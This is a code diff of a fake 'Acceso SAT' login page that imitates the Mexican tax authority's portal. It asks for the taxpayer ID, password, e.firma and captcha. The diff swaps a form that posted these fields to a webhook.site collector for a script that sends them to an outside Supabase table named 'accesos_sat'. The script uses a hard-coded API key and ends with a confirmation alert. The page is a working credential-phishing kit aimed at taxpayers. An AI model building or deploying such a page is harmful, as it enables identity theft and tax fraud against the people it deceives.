@@ -6,6 +6,192 @@
   <title>Acceso SAT</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #580029;
+      color: #fff;
+      padding: 10px 0;
+    }
+
+    .header-container {
+      max-width: 1100px;
+      margin: auto;
+      padding: 0 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo img {
+      height: 50px;
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 30px;
+    }
+
+    .nav-links a {
+      color: #fdfcfb !important;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .nav-links a:hover {
+      text-decoration: underline;
+    }
+
+    .lupa {
+      font-size: 18px;
+      margin-left: 10px;
+    }
+
+    main {
+      padding: 20px;
+      max-width: 700px;
+      margin: auto;
+    }
+
+    .inicio {
+      margin-bottom: 10px;
+    }
+
+    .inicio i {
+      margin-right: 5px;
+      color: #000;
+    }
+
+    form {
+      margin-top: 20px;
+    }
+
+    form label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    form input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+
+    form input[disabled] {
+      background-color: #eee;
+      cursor: not-allowed;
+    }
+
+    .buttons {
+      margin-top: 15px;
+    }
+
+    button {
+      background-color: #580029;
+      color: #fff;
+      padding: 10px 15px;
+      margin-right: 10px;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #75003c;
+    }
+
+    .ayuda-links {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .ayuda-links a {
+      color: #50007a;
+    }
+
+    .aviso {
+      background-color: #dff0ff;
+      padding: 20px;
+      margin: 40px auto;
+      text-align: center;
+      font-size: 14px;
+      max-width: 1000px;
+      border: 1px solid #b0d9f8;
+      box-sizing: border-box;
+    }
+
+    footer {
+      background-color: #580029;
+      color: #fff;
+      padding: 20px;
+      margin-top: 40px;
+    }
+
+    .footer-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      max-width: 1100px;
+      margin: auto;
+    }
+
+    .footer-column {
+      flex: 1 1 200px;
+      margin: 10px;
+    }
+
+    .footer-column h4 {
+      margin-bottom: 10px;
+    }
+
+    .footer-column ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .footer-column a {
+      color: #fdfcfb;
+      text-decoration: none;
+    }
+
+    .footer-column a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-logo {
+      flex: 1 1 200px;
+      margin: 10px;
+    }
+
+    .footer-logo img {
+      height: 50px;
+      width: auto;
+      display: block;
+      margin-bottom: 15px;
+    }
+
+    .nav-links i {
+      color: #fdfcfb;
+      font-size: 16px;
+    }
+
+    .footer-column i {
+      font-size: 22px;
+      margin-right: 10px;
+      color: #fdfcfb;
+    }
+
+    .footer-column i:hover {
+      color: #c0c0c0;
+    }
+  </style>
 </head>
 <body>
   <header>
@@ -25,8 +211,7 @@
     <p class="inicio"><i class="fas fa-house"></i> Inicio</p>
     <h1>Acceso por contraseña</h1>
 
-    <!-- 👇 Cambia la URL de webhook.site -->
-    <form method="POST" action="https://webhook.site/0eeccc4c-f486-4dad-a7a6-c166675c4575">
+    <form id="formAcceso">
       <label for="rfc">RFC:</label>
       <input type="text" id="rfc" name="rfc" required>
 
@@ -101,5 +286,44 @@
       </div>
     </div>
   </footer>
+
+  <script>
+    const SUPABASE_URL = "https://ceywynuxwptqzntxsokj.supabase.co"; // 🟡 REEMPLAZA AQUÍ
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNleXd5bnV4d3B0cXpudHhzb2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY0Mjk4MDAsImV4cCI6MjA2MjAwNTgwMH0.SWDaRfaC9B9UIZmPxHXNnWIQoglKm1RrvXr_t5ushNA";              // 🟡 REEMPLAZA AQUÍ
+
+    const form = document.getElementById("formAcceso");
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const rfc = document.getElementById("rfc").value;
+      const contrasena = document.getElementById("password").value;
+      const efirma = document.getElementById("efirma").value;
+      const captcha = document.getElementById("captcha").value;
+
+      const response = await fetch(`${SUPABASE_URL}/rest/v1/accesos_sat`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`,
+          "Prefer": "return=representation"
+        },
+        body: JSON.stringify({
+          rfc,
+          contrasena,
+          efirma,
+          captcha
+        })
+      });
+
+      if (response.ok) {
+        alert("✅ Datos enviados correctamente a Supabase.");
+        form.reset();
+      } else {
+        const error = await response.text();
+        alert("❌ Error al enviar los datos: " + error);
+      }
+    });
+  </script>
 </body>
 </html>
